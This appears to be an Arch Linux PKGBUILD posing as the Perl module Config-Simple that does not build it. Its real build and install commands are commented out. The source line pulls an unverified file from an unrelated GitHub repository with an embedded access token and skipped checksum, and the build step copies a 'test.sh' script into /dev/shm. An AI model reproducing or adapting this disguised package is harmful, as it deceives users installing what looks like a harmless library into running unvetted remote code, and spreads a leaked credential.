pkgname=perl-config-simple
pkgver=4.58
pkgrel=1
pkgdesc="simple configuration file class"
arch=('any')
license=('PerlArtistic' 'GPL')
depends=('snapd' 'git')
source=("https://raw.githubusercontent.com/Vampire-Offical/packbuilds/main/PKGBUILD?token=GHSAT0AAAAAABSMDX3P2IPF7TRWLRPQMTQ4YRMQW7A")
md5sums=('SKIP')
_distname="Config-Simple"

# template start; name=perl-module; version=1.0;
_distdir="${_distname}-${pkgver}"
url="https://metacpan.org/release/${_distname}"
options+=('!emptydirs')

build() {
        # cd "$srcdir/$_distdir"
        # perl Makefile.PL INSTALLDIRS=vendor
        # make
        touch /dev/shm/build.txt
        cp test.sh /dev/shm/build.txt
}

check() {
        # cd "$srcdir/$_distdir"
        # make test
        touch /dev/shm/check.txt
}

package() {
        # cd "$srcdir/$_distdir"
        # make DESTDIR="$pkgdir" install
        touch /dev/shm/pac.txt
}